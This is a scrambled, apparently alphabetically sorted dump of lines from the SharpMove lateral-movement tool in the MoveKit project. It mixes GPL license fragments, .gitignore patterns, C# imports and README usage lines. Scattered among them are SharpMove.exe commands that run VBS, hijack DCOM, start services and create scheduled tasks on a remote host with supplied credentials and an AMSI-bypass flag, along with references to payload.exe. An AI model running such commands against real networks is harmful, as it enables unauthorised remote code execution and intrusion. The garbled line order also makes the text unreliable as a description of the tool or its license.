Part of [MoveKit](https://github.com/0xthirteen/MoveKit)
Program specifies that a certain numbered version of the GNU General
PublishScripts/
Release
SUCH DAMAGES.
ServiceFabricBackup/
SharpMove.exe action=executevbs computername=remote.host.local eventname=Debug amsi=true username=domain
SharpMove.exe action=hijackdcom computername=remote.host.local clsid={40bdc4e5-d532-42e6-b667-1ab890fdebcf}
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
SolutionGuid = {58EF8468-9863-478A-AF0A-159C357264A4}
Source.
States should not allow patents to restrict development and use of
StyleCopReport.xml
THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR
TRACE</DefineConstants>
Temp filename=file.exe eventname=Debug amsi=true username=domain
Temp filename=file.exe eventname=Debug taskname=Debug amsi=true username=domain
TestResult.xml
The hypothetical commands 
To compile open Visual Studio project and compile for release.
USE OR INABILITY TO USE THE PROGRAM (INCLUDING BUT NOT LIMITED TO LOSS OF
UpgradeLog
User Product is transferred to the recipient in perpetuity or for a
VisualStudioVersion = 15.0.28307.271
Windows
Windows Script
[Aa][Rr][Mm]/
[Aa][Rr][Mm]64/
[Bb]in/
[Bb]uild[Ll]og.
[Dd]ebug/
[Dd]ebugPS/
[Dd]ebugPublic/
[Ee]xpress/
[Ll]og/
[Ll]ogs/
[Oo]bj/
[Rr]elease/
[Rr]eleasePS/
[Rr]eleases/
[Tt]est[Rr]esult
[assembly: ComVisible(false)]
] Process ID                     : {0}
] Waiting 10 seconds for event '{0}' to trigger
_Chutzpah
_NCrunch_
_Pvt_Extensions
_ReSharper
_TeamCity
_UpgradeReport_Files/
__pycache__/
_h.h
_i.c
_p.c
_pkginfo.txt
_wpftmp.csproj
a further restriction but permits relicensing or conveying under this
a modified version of its Corresponding Source.  The information must
address new problems or concerns.
adversely affects the operation of the network or violates the rules and
an absolute waiver of all civil liability in connection with the
and execute modified versions of a covered work in that User Product from
and the Corresponding Source of the work is not available for anyone
and you may offer support or warranty protection for a fee.
any implied license or other defenses to infringement that may
any other work released this way by its authors.  You can apply it to
appropriately publish on each copy an appropriate copyright notice
artifacts/
author or copyright holder as a result of your choosing to follow a
authors of previous versions.
avoid the special danger that patents applied to a free program could
been installed in ROM).
beyond what the individual works permit.  Inclusion of a covered work
bld/
bower_components/
but do not include claims that would be infringed only as a
by the Free Software Foundation.
by the Installation Information.  But this requirement does not apply
can do so.  This is fundamentally incompatible with the aim of
can regenerate automatically from other parts of the Corresponding
circumvention of technological measures to the extent such circumvention
code is in no case prevented or interfered with solely because
combination as such.
conditioned on the non-exercise of one or more of the rights that are
conditions are met.  This License explicitly affirms your unlimited
consequence of further modification of the contributor version.  For
copy of the Program in return for a fee.
country that you have reason to believe are valid.
covered work so as to satisfy simultaneously your obligations under this
crunch
csx/
dlldata.c
documented (and with an implementation available to the public in
doubtful cases shall be resolved in favor of coverage.  For a particular
ecf/
excuse you from the conditions of this License.  If you cannot convey a
file.exe
for and in connection with specific products or compilations that
for enforcing compliance by third parties with this License.
for which you have or can give appropriate copyright permission.
form of a work.
free software which everyone can redistribute and change under these terms.
governed by this License along with a term that is a further
have designed this version of the GPL to prohibit the practice for those
have the freedom to distribute copies of free software (and charge for
healthchecksdb
holder fails to notify you of the violation by some reasonable means
if neither you nor any third party retains the ability to install
implementation is available to the public in source code form.  A
in accord with this section must be in a format that is publicly
in an aggregate does not cause this License to apply to the other
in force.  You may convey covered works to others for the sole purpose
in one of these ways:
included in conveying the object code work.
includes interface definition files associated with source files for
ipch/
is a consumer product regardless of whether the product has substantial
is effected by exercising rights under this License with respect to
is widely used among developers working in that language.
issue-259490424)
issuecomment-104372622)
it.  (Additional permissions may be written to require their own
keep intact all notices of the absence of any warranty
keep intact all notices stating that this License and any
know their rights.
later version.
license from a particular copyright holder is reinstated (a)
licenses of parties who have received copies or rights from you under
licenses to the work the party's predecessor in interest had or could
makes it unnecessary.
material under section 10.
may consider it more useful to permit linking proprietary applications with
measure under any applicable law fulfilling obligations under article
measures.
might be different
modification follow.
modification has been made.
modify any covered work.  These actions infringe copyright if you do
mono_crash.
n  Scope: 
nCrunchTemp_
namespace SharpMove
network may be denied when the modification itself materially and
node_modules/
non-permissive terms added in accord with section 7 apply to the code
not control copyright.  Those thus making or running the covered works
not survive such relicensing or conveying.
nothing other than this License grants you permission to propagate or
notice like this when it starts in an interactive mode:
nunit-
occurring solely as a consequence of using peer-to-peer transmission
of the particular user or of the way in which the particular user
on the Program.
option of following the terms and conditions either of that numbered
or can get the source code.  And you must show them these terms so they
orleans.codegen.cs
otherwise be available to you under applicable patent law.
paket-files/
paragraph of section 11).
part of a transaction in which the right of possession and use of the
parties to make or receive copies.  Mere interaction with a user through
parts of the aggregate.
party means to make such an agreement or commitment not to enforce a
patent against the party.
patent license (a) in connection with copies of the covered work
patent sublicenses in a manner consistent with the requirements of
patents cannot be used to render the program non-free.
pattern of such abuse occurs in the area of products for individuals to
payload.exe
permission to link or combine any covered work with a work licensed
permission to run the unmodified Program.  The output from running a
price.  Our General Public Licenses are designed to make sure that you
prior to 60 days after the cessation.
programs which are used unmodified in performing those activities but
project.fragment.lock.json
project.lock.json
propagate the contents of its contributor version.
protecting users' freedom to change the software.  The systematic
protocols for communication across the network.
provided under this License.  Any attempt otherwise to propagate or
public statement of acceptance of a version permanently authorizes you
publish/
rcf/
received notice of violation of this License (for any work) from that
recipients a copy of this License along with the Program.
reinstated permanently if the copyright holder notifies you of the
removal in certain cases when you modify the work.)  You may place
reviewing courts shall apply local law that most closely approximates
root
run a copy of the Program.  Ancillary propagation of a covered work
same work.
share and change all versions of a program--to make sure it remains free
show c' for details.
show c' should show the appropriate
show w' and 
show w'.
similar laws prohibiting or restricting circumvention of such
software and other kinds of works.
specifically granted under this License.  You may not convey a covered
stand ready to extend this provision to those domains in future versions
state the exclusion of warranty
subprograms and other parts of the work.
such as by intimate data communication or control flow between those
suffice to ensure that the continued functioning of the modified object
technological measures.
tells the user that there is no warranty for the work (except to the
temp
that material) supplement the terms of this License with terms:
that there is no warranty for this free software.  For both users' and
that they are valid under applicable law.  If additional permissions
the GNU General Public License from time to time.  Such new versions will
the GNU General Public License is intended to guarantee your freedom to
the User Product in which it has been modified or installed.  Access to a
the above requirements apply either way.
the conditions stated below.  Sublicensing is not allowed
the only significant mode of use of the product.
the predecessor has it or can get it with reasonable efforts.
the terms of this License in conveying all material for which you do
then you must either (1) cause the Corresponding Source to be so
this License (including any patent licenses granted under the third
this License without regard to the additional permissions.
this License.
this License.  If your rights have been terminated and not permanently
to attach them to the start of each source file to most effectively
to choose that version for the Program.
to collect a royalty for further conveying from those to whom you convey
to the extent that it includes a convenient and prominently visible
to the third party based on the extent of your activity of conveying
transaction who receives a copy of the work also receives whatever
under version 3 of the GNU Affero General Public License into a single
used to limit the access or legal rights of the compilation's users
user password=password
user password=password taskname=TestTask
using System
using System.Collections.Generic
using System.Linq
using System.Management
using System.Reflection
using System.Runtime.CompilerServices
using System.Runtime.InteropServices
using System.ServiceProcess
using System.Threading
using TaskScheduler
version or of any later version published by the Free Software
where to find the applicable terms.
windows
work and works based on it.
work if you are a party to an arrangement with a third party that is
wwwroot/
x64/
x86/
you grant is automatically extended to all recipients of the covered
you modify it: responsibilities to respect the freedom of others.
your copyrighted material outside their relationship with you.
your receipt of the notice.
{8BF82BBE-909C-4777-A2FC-EA7C070FF43E}.Debug
{8BF82BBE-909C-4777-A2FC-EA7C070FF43E}.Release
